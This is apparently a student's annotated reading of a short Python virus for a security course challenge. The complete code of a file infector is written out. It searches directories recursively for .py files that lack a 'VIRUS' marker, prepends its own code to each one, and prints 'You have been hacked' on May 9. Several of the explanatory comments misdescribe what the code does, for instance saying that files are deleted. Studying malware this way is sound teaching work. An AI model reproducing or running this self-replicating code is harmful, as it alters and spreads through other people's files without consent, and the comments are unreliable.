#!/usr/bin/python
# Script:                        Ops 301 Challenge 14
# Translator:                    Alex Wise
# Date of latest revision:       01/02/2023
# Purpose:                       How to read scripting 


# imports modules
# The OS module in Python provides functions for creating and removing a directory (folder), 
# fetching its contents, changing and identifying the current directory, etc. You first need to import the os module to interact with the underlying operating system.
import os

# A date in Python is not a data type of its own, but we can import a module named datetime to work with dates as date objects.
import datetime

# creates variable with "VIRUS" as the string
SIGNATURE = "VIRUS"

# Defines the function and declares files targeted with the []
def locate(path):
    files_targeted = []
    
    # calls on all files and directores in "path"
    filelist = os.listdir(path)
   
    # for loop
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
         
          # adds to the list of targets 
            files_targeted.extend(locate(path+"/"+fname))
       
        # chnages infected status to "false" if = to .py (Python)
        elif fname[-3:] == ".py":
            infected = False
           
            # for loop
            for line in open(path+"/"+fname):
               
                # calls on abive set variable to change from true to false in order to hide infection status 
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
               
                # appends (adds) path and name to list
                files_targeted.append(path+"/"+fname)
    
    # ends the efunction if all variables show false and returns result
    return files_targeted


# creates second function- uses the files found previously and deletes them
def infect(files_targeted):
   
    # "Virus" variable that opens file path
    virus = open(os.path.abspath(__file__))
   
    # creates empty variable in order to hide the fact that a VIRUS is present 
    virusstring = ""
    
    # for loop -enumerates previous file path- variable-The enumerate function in Python converts a data collection object into an enumerate object. 
    # Enumerate returns an object that contains a counter as a key for each value within an object, making items within the collection easier to access.
    for i,line in enumerate(virus):
        if 0 <= i < 39:
         
          # two variables and assigns final value
            virusstring += line
    virus.close
    
    # for loop to find,read and create files f read contents and new virusstring variable
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()


# creates third function- prints line on May ninth
def detonate():
    
    # specifies date using imported datetime module
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        
        # prints messgae to screen
        print "You have been hacked"
        

# calls defined functions and Detonates to cause multiple reactions to the same script 
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()


# End 
